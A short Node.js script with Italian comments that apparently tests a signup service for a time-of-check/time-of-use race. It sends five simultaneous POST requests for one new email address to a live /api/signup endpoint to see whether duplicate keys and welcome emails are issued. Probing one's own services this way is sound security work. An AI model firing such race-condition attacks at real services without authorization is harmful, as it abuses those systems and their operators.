/**
 * TOCTOU sul rilascio chiave: 5 richieste SIMULTANEE per un'email mai vista.
 * Se il controllo "esiste gia'?" e la scrittura non sono atomici, tutte e cinque
 * leggono "non esiste" e ne creano cinque — cinque chiavi, cinque email di
 * benvenuto, per un solo intento.
 */
const { newCleanTab, disposeContext, connect } = require("./cdp");
(async () => {
  const h = await newCleanTab("about:blank");
  const tab = await connect(h.id);
  try {
    await tab.goto("https://emailguard.dev/signup");
    await tab.waitFor("document.querySelector('input[type=email]')", 30000);
    const email = "antonio.alt3000+ztrace" + Date.now() + "@gmail.com";
    const res = await tab.eval(`(async () => {
      const email = ${JSON.stringify("PLACEHOLDER")};
      const bodies = await Promise.all([1,2,3,4,5].map(function(){
        return fetch('/api/signup', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({ email: email }) })
          .then(function(r){ return r.text().then(function(t){ return r.status + ' ' + t.slice(0,180); }); })
          .catch(function(e){ return 'ERR ' + e.message; });
      }));
      return bodies;
    })()`.replace('"PLACEHOLDER"', JSON.stringify(email)));
    console.log("email usata:", email);
    res.forEach(function (b, i) { console.log(` [${i + 1}] ${b}`); });
  } finally { tab.close(); await disposeContext(h); }
})().catch(e => { console.error("FAIL", e.message); process.exit(1); });
